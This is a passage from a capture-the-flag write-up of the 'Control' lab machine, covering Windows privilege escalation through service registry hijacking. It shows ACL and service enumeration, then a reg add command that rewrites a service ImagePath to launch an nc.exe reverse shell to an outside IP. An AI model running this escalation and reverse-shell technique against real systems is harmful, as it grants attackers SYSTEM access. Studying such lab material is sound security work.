get-acl HKLM:\SYSTEM\CurrentControlset\Services\DeviceInstall | fl


Path   : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Services\DeviceInstall
Owner  : NT AUTHORITY\SYSTEM
Group  : NT AUTHORITY\SYSTEM
Access : APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES Allow  ReadKey
         NT AUTHORITY\SYSTEM Allow  FullControl
         CREATOR OWNER Allow  FullControl
         NT AUTHORITY\Authenticated Users Allow  ReadKey
         NT AUTHORITY\SYSTEM Allow  FullControl
         CONTROL\Hector Allow  FullControl
         BUILTIN\Administrators Allow  FullControl
Audit  : 
Sddl   : O:SYG:SYD:AI(A;CIID;KR;;;AC)(A;ID;KA;;;SY)(A;CIIOID;KA;;;CO)(A;CIID;KR;;;AU)(A;CIIOID;KA;;;SY)(A;CIID;KA;;;S-1
         -5-21-3271572904-80546332-2170161114-1000)(A;CIID;KA;;;BA)
```

With those permissions DeviceInstall could make for an attackable service. Let’s query the registry for more information to see how a service entry looks like:

```aaa
PS C:\Users\Hector\Documents> reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Services\DeviceInstall
reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Services\DeviceInstall

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Services\DeviceInstall
    Description    REG_SZ    @%SystemRoot%\system32\umpnpmgr.dll,-101
    DisplayName    REG_SZ    @%SystemRoot%\system32\umpnpmgr.dll,-100
    ErrorControl    REG_DWORD    0x1
    FailureActions    REG_BINARY    100E0000000000000000000003000000140000000100000060EA000001000000C0D401000000000000000000
    FailureActionsOnNonCrashFailures    REG_DWORD    0x1
    Group    REG_SZ    PlugPlay
    ImagePath    REG_EXPAND_SZ    %SystemRoot%\system32\svchost.exe -k DcomLaunch -p
    ObjectName    REG_SZ    LocalSystem
    PreshutdownTimeout    REG_DWORD    0x36ee80
    RequiredPrivileges    REG_MULTI_SZ    SeTcbPrivilege\0SeSecurityPrivilege\0SeAssignPrimaryTokenPrivilege\0SeTakeOwnershipPrivilege\0SeLoadDriverPrivilege\0SeBackupPrivilege\0SeRestorePrivilege\0SeImpersonatePrivilege\0SeAuditPrivilege\0SeChangeNotifyPrivilege\0SeUndockPrivilege\0SeDebugPrivilege\0SeShutdownPrivilege
    ServiceSidType    REG_DWORD    0x1
    Start    REG_DWORD    0x3
    Type    REG_DWORD    0x20

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Services\DeviceInstall\Parameters
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Services\DeviceInstall\TriggerInfo
PS C:\Users\Hector\Documents>
```

Out of all those keys, the one we are interested in is ImagePath. The ImagePath key tells Windows what command to execute when a service needs to be started. If we could change the ImagePath value of one of these services thanks to the permissions seen above and then start that service we would be able to execute arbitrary code as the local SYSTEM account.

Unfortunately, just because a registry ACL includes full control to Hector, it doesn’t mean we will be able to start that service. Hector is not a member of the Administrators group and so cannot arbitrarily shut down or restart services, we’re going to have to do some more trial and error to find some services we can control and which are also not running and we can start ourselves.

---

## Privilege Escalation: Windows Service Hijack

(improvised term)

The [Get-Service](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-service?view=powershell-7) cmdlet comes to our aid, by using it to query a service we can tell whether that service is running or not:

```aaa
PS C:\Users\Hector\Documents> get-service NetTcpPortSharing | fl
get-service NetTcpPortSharing | fl


Name                : NetTcpPortSharing
DisplayName         : Net.Tcp Port Sharing Service
Status              : Stopped
DependentServices   : {}
ServicesDependedOn  : {}
CanPauseAndContinue : False
CanShutdown         : False
CanStop             : False
ServiceType         : Win32ShareProcess
```

So services that can be queried with Get-Service and appear not to be running make for potential targets. Once again because Hector has limited permissions over services, only a portion of them can be queried with the cmdlet and this allows us to narrow down the number of targets to enumerate.

With some string manipulation we can turn the output file given to us earlier by the reg query command into a .ps1 script like this:

```aaa
Get-Service -Name ".NET CLR Data"
Get-Service -Name ".NET CLR Networking"
Get-Service -Name ".NET CLR Networking 4.0.0.0"
Get-Service -Name ".NET Data Provider for Oracle"
Get-Service -Name ".NET Data Provider for SqlServer"
Get-Service -Name ".NET Memory Cache 4.0"
Get-Service -Name ".NETFramework"
Get-Service -Name "1394ohci"
Get-Service -Name "3ware"
Get-Service -Name "ACPI"
Get-Service -Name "AcpiDev"
Get-Service -Name "acpiex"
Get-Service -Name "acpipagr"
Get-Service -Name "AcpiPmi"
Get-Service -Name "acpitime"
Get-Service -Name "ADOVMPPackage"
Get-Service -Name "ADP80XX"
Get-Service -Name "adsi"
Get-Service -Name "ADWS"
Get-Service -Name "AFD"
Get-Service -Name "afunix"
Get-Service -Name "ahcache"
Get-Service -Name "AJRouter"
Get-Service -Name "ALG"
Get-Service -Name "AmdK8"
Get-Service -Name "AmdPPM"
[....]
```

Download, execute, redirect output to a file and the result will be something like the following:

```aaa
Status   Name               DisplayName                           
------   ----               -----------                           
Stopped  applockerfltr      Smartlocker Filter Driver             
Stopped  AppMgmt            Application Management                
Stopped  AppVClient         Microsoft App-V Client                
Running  BFE                Base Filtering Engine                 
Running  BrokerInfrastru... Background Tasks Infrastructure Ser...
Running  CLFS               Common Log (CLFS)                     
Running  ClipSVC            Client License Service (ClipSVC)      
Stopped  ConsentUxUserSvc   ConsentUX                             
Running  DcomLaunch         DCOM Server Process Launcher          
Stopped  DevicePickerUse... DevicePicker                          
Stopped  DevicesFlowUserSvc DevicesFlow                           
Running  Dhcp               DHCP Client                           
Stopped  dmwappushservice   Device Management Wireless Applicat...
Running  Dnscache           DNS Client                            
Stopped  DoSvc              Delivery Optimization                 
Running  DsSvc              Data Sharing Service                  
Stopped  EFS                Encrypting File System (EFS)          
Running  EventLog           Windows Event Log                     
Stopped  icssvc             Windows Mobile Hotspot Service        
Stopped  KtmRm              KtmRm for Distributed Transaction C...
Running  LSM                Local Session Manager                 
Stopped  MapsBroker         Downloaded Maps Manager               
Running  mpsdrv             Windows Defender Firewall Authoriza...
Running  mpssvc             Windows Defender Firewall             
Running  MSDTC              Distributed Transaction Coordinator   
Running  NetBT              NetBT                                 
Stopped  NetSetupSvc        Network Setup Service                 
Stopped  NetTcpPortSharing  Net.Tcp Port Sharing Service          
Stopped  NgcCtnrSvc         Microsoft Passport Container          
Stopped  NgcSvc             Microsoft Passport                    
Stopped  PhoneSvc           Phone Service                         
Stopped  PimIndexMainten... Contact Data                          
Stopped  pla                Performance Logs & Alerts             
Stopped  PrintWorkflowUs... PrintWorkflow                         
Stopped  RasAcd             Remote Access Auto Connection Driver  
Stopped  RasAuto            Remote Access Auto Connection Manager 
Running  RasMan             Remote Access Connection Manager      
Stopped  RemoteAccess       Routing and Remote Access             
Stopped  RmSvc              Radio Management Service              
Running  RpcEptMapper       RPC Endpoint Mapper                   
Running  RpcSs              Remote Procedure Call (RPC)           
Stopped  RSoPProv           Resultant Set of Policy Provider      
Running  SamSs              Security Accounts Manager             
Running  Schedule           Task Scheduler                        
Stopped  seclogon           Secondary Logon                       
Stopped  SecurityHealthS... Windows Security Service              
Stopped  SEMgrSvc           Payments and NFC/SE Manager           
Running  SENS               System Event Notification Service     
Stopped  SensorService      Sensor Service                        
Stopped  SensrSvc           Sensor Monitoring Service             
Stopped  smphost            Microsoft Storage Spaces SMP          
Running  Spooler            Print Spooler                         
Stopped  sppsvc             Software Protection                   
Running  SstpSvc            Secure Socket Tunneling Protocol Se...
Running  SystemEventsBroker System Events Broker                  
Running  TimeBrokerSvc      Time Broker                           
Stopped  UevAgentService    User Experience Virtualization Service
Stopped  UnistoreSvc        User Data Storage                     
Stopped  UserDataSvc        User Data Access                      
Stopped  UsoSvc             Update Orchestrator Service           
Stopped  vds                Virtual Disk                          
Stopped  WaaSMedicSvc       Windows Update Medic Service          
Stopped  WdBoot             Windows Defender Antivirus Boot Driver
Running  WdFilter           Windows Defender Antivirus Mini-Fil...
Running  WdNisDrv           Windows Defender Antivirus Network ...
Running  WdNisSvc           Windows Defender Antivirus Network ...
Running  WinDefend          Windows Defender Antivirus Service    
Running  WinHttpAutoProx... WinHTTP Web Proxy Auto-Discovery Se...
Stopped  WpnUserService     Windows Push Notifications User Ser...
Stopped  wuauserv           Windows Update  
```

Let’s see if we can start any of these stopped services. Most of them will give an error like this:

```aaa
PS C:\temp> start-service ktmrm
start-service ktmrm
start-service : Service 'KtmRm for Distributed Transaction Coordinator (ktmrm)' cannot be started due to the following 
error: Cannot open ktmrm service on computer '.'.
At line:1 char:1
+ start-service ktmrm
+ ~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : OpenError: (System.ServiceProcess.ServiceController:ServiceController) [Start-Service],  
   ServiceCommandException
    + FullyQualifiedErrorId : CouldNotStartService,Microsoft.PowerShell.Commands.StartServiceCommand
```

But a few will not act so whiny, for example:

```aaa
PS C:\temp> start-service pla
start-service pla
PS C:\temp> get-service pla | fl
get-service pla | fl


Name                : pla
DisplayName         : Performance Logs & Alerts
Status              : Running
DependentServices   : 
ServicesDependedOn  : {RPCSS}
CanPauseAndContinue : False
CanShutdown         : True
CanStop             : True
ServiceType         : Win32ShareProcess
```

That means the service is attackable because we can tell Windows to start it after overwriting the original registry value with our payload, which could simply be an nc.exe reverse shell, in that case [reg add](https://ss64.com/nt/reg.html) is used to change a service’s ImagePath key like this:

```aaa
reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Services\netsetupsvc /v ImagePath /D "C:\Users\Hector\Documents\nc.exe -e cmd.exe 10.10.15.203 7777"
```

Run Start-Service after the write operation and the payload will be executed:

![img](/images/writeup-control/14.png)

This concludes the writeup for Control, I hope it was exhaustive, interesting, and comprehensible all at the same time.

Stay safe.

